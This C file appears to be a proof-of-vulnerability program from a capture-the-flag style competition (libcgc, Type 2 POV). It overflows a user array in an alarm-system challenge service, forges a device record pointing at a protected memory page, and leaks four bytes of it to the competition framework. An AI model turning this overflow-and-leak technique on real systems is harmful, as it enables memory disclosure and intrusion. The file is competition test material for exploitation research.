/*

Author: Joe Rogers <joe@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include <libcgc.h>

#define EBP (5)
#define FRAMEWORK (3)

unsigned int ReadBytes(int fd, char *buf, unsigned int len) {
	unsigned int total_bytes = 0;
	size_t rx_bytes;
	unsigned char c;

	while (total_bytes < len) {
		if (receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

unsigned int SendBytes(int fd, char *buf, unsigned int len) {
	size_t tx_bytes;
	unsigned int total_bytes = 0;

	while (total_bytes < len) {
		if (transmit(fd, buf+total_bytes, 1, &tx_bytes) != 0) {
			return(0);
		}
		if (tx_bytes != 1) {
			return(0);
		}
		total_bytes++;
	}

	return(total_bytes);
}

void NegotiateType2Pov(unsigned int *type2_addr, unsigned int *type2_size, unsigned int *type2_length) {
	unsigned int PovType = 2;

	// Request Type 2 negotitation
	if (SendBytes(3, (char *)&PovType, 4) != 4) {
		_terminate(-1);
	}

	// get the 4-byte value for type2_addr
	if (ReadBytes(3, (char *)type2_addr, 4) != 4) {
		_terminate(-1);
	}
	// get the 4-byte value for type2_size
	if (ReadBytes(3, (char *)type2_size, 4) != 4) {
		_terminate(-1);
	}
	// get the 4-byte value for type2_length
	if (ReadBytes(3, (char *)type2_length, 4) != 4) {
		_terminate(-1);
	}

	return;
}

int main(void) {
	unsigned int type2_addr;
	unsigned int type2_size;
	unsigned int type2_length;
	char Req[1024];
	unsigned int val = 0x01010101;
	unsigned int i;

	// negotiate a Type2 POV with the Competition Framework
	NegotiateType2Pov(&type2_addr, &type2_size, &type2_length);

	// Create max users
	for (i = 0; i < 128; i++) {
		SendBytes(STDOUT, "\x00", 1); // CMD_ADD_USER
		SendBytes(STDOUT, (char *)&val, 4); // username
		SendBytes(STDOUT, "AAAAAAAAAAAAAAAAAAAAAAAAAAA\x00", 28); // rest of username
		SendBytes(STDOUT, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00", 32); // first name (doesn't matter)
		SendBytes(STDOUT, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00", 32); // last name (doesn't matter)
		SendBytes(STDOUT, (char *)&val, 4); // pin
		SendBytes(STDOUT, "0\x00", 2); // rest of pin
		SendBytes(STDOUT, (char *)&val, 4); // access code
		SendBytes(STDOUT, "000000000000000000000000000\x00", 28); // rest of access code
		ReadBytes(STDIN, Req, 3);
		val++;
	}

	// Create one more user to overflow the array index
	SendBytes(STDOUT, "\x00", 1); // CMD_ADD_USER
	SendBytes(STDOUT, "AAAAAA", 6); // get us to the Device structure aligned address
	SendBytes(STDOUT, "\x01\x00\xff\xff", 4); // Keypad-type device, DeviceId = 0xffff
	SendBytes(STDOUT, "\x00\xc0\x47\x43", 4); // Keypad authorized codes pointer set to the magic page
	SendBytes(STDOUT, "AAAAAAAAAAAAAAAAA\x00", 18); // rest of username
	SendBytes(STDOUT, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00", 32); // first name (doesn't matter)
	SendBytes(STDOUT, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00", 32); // last name (doesn't matter)
	SendBytes(STDOUT, (char *)&val, 4); // pin
	SendBytes(STDOUT, "0\x00", 2); // rest of pin
	SendBytes(STDOUT, (char *)&val, 4); // access code
	SendBytes(STDOUT, "000000000000000000000000000\x00", 28); // rest of access code
	ReadBytes(STDIN, Req, 3);

	// send the List Codes command to dump the magic page
	SendBytes(STDOUT, "\x08", 1); // CMD_LIST_ALARM_CODES
	SendBytes(STDOUT, "\xff\xff", 2); // Our fake device entry's ID
	ReadBytes(STDIN, Req, 1); // read the number of alarm codes we'll be receiving
	ReadBytes(STDIN, Req, 4); // read the first 4 bytes of the first code
	
	// Send the value
	SendBytes(FRAMEWORK, Req, 4);

}
